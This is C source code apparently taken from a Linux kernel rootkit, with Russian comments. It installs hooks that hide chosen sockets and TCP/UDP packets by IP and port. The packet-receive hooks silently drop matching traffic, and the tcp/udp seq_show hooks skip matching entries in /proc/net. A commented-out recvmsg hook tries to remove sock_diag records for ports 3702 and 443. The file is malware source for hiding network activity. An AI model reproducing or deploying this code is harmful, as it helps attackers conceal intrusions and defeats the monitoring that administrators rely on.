// #include <asm-generic/access_ok.h>

/*
    Скрывает:
    - сокеты по ip и port
    - tcp udp пакеты по ip и port
*/

/*
    Находятся в src/hide/filter_functions.c
    
    bool is_hide_packet(struct sk_buff *skb);    
    bool is_skip4_seq_show (void *v, enum Protocols protocol);
    bool is_skip6_seq_show (void *v, enum Protocols protocol);
*/

extern int debug_lvl;

static int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb); 
        return 1;  
    }

    int ret = real_packet_rcv(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}

static int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb); 
        return 1;  
    }

    int ret = real_packet_rcv_spkt(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}

static int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
    if (is_hide_packet(skb)) {
        consume_skb(skb);
        return 1;  
    }

    int ret = real_tpacket_rcv(skb, dev, pt, orig_dev);
    udelay(200);
    return ret;
}



// static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs) {
//     long ret = real_sys_recvmsg(regs);

//     if (ret <= 100 ) {
//         goto out;
//     }

// // ------------------------- get iov_base -------------------------------
//     struct user_msghdr __user *umsg = (struct user_msghdr __user *)regs->si;
//     struct iovec __user *umsg_iov;
//     void __user *uiov_base;

//     char *buffer;

//     if (!umsg || !access_ok(umsg, sizeof(*umsg)) || get_user(umsg_iov, &umsg->msg_iov)) {
//         if (debug_lvl) {
//             pr_err("Failed to get msg_iov\n");
//         }
//         goto out;
//     }

//     if (get_user(uiov_base, &umsg_iov->iov_base)) {
//         if (debug_lvl) {
//             pr_err("Failed to get iov_base\n");
//         }
//         goto out;
//     }
    
//     if (!uiov_base || !access_ok(uiov_base, ret)) {
//         goto out;
//     }
        
//     buffer = kzalloc(ret, GFP_KERNEL);
//     if (buffer == NULL) {
//         if (debug_lvl) {
//             pr_err("Failed to kzalloc buffer\n");
//         }
//         goto out;
//     }

//     if (copy_from_user(buffer, uiov_base, ret)) {
//         if (debug_lvl) {
//             pr_err("Failed to copy_from_user iov_base\n");
//         }
//         goto out;
//     }

// // ----------------------------------------------------------------------

// // ------------------------- read buffer --------------------------------
// // struct nlmsghdr          netlink.h
// // struct inet_diag_msg     inet_diag.h

//     int offset = 0;                                             // смещение по записям
//     __u32 nlmsg_len;                                            // размер записи
//     struct nlmsghdr *nlh = (struct nlmsghdr *) buffer;          // указатель на начало записи

//     // Ищем и удаляем запись
//     while (offset < ret) {
//         nlh = (struct nlmsghdr *)((char *)nlh + offset);
//         nlmsg_len = nlh->nlmsg_len;

//         if (((struct nlmsghdr*)buffer)->nlmsg_type != SOCK_DIAG_BY_FAMILY) {
//             goto out;
//         }

//         struct inet_diag_msg *idm = (struct inet_diag_msg*) ((char *)buffer + sizeof(struct nlmsghdr));
        
//         if (
//             ((struct inet_diag_sockid)idm->id).idiag_sport == htons(3702) || 
//             ((struct inet_diag_sockid)idm->id).idiag_dport == htons(443) 
//             ) {
//             if (debug_lvl) {
//                 pr_info("hola\n");
//             }    

//             // memmove(nlh, (char *)nlh + nlmsg_len, (char *)buffer + ret - ((char *)nlh + nlmsg_len));
//             // ret -= nlmsg_len;
//             // memset((char *)buffer + ret, 0, nlmsg_len);

//             // continue;
//         }

//         offset += nlmsg_len;
//     }

//     pr_info("new ret %d\n", (int)ret);

//     // if (copy_to_user(uiov_base, buffer, ret)) {
//     //     if (debug_lvl) {
//     //         pr_err("Failed to copy_to_user buffer\n");
//     //     }
// 	// 	goto out;
// 	// }

//     if (!ret) {
//         ret = -EAGAIN;
//     }
// // ----------------------------------------------------------------------

// out:
//     if (buffer) {
//         kfree(buffer);
//     }

//     return ret;
// }



// -------------------- filter from /proc/net/* -------------------------
// ===================== Перехват функций ===============================

static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long res = real_tcp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }

    return res;
}

static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v)
{
    long res = real_udp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return res;
}

static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long res = real_tcp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }
    return res;
}

static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
{
    long res = real_udp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return res;
}

// ======================================================================
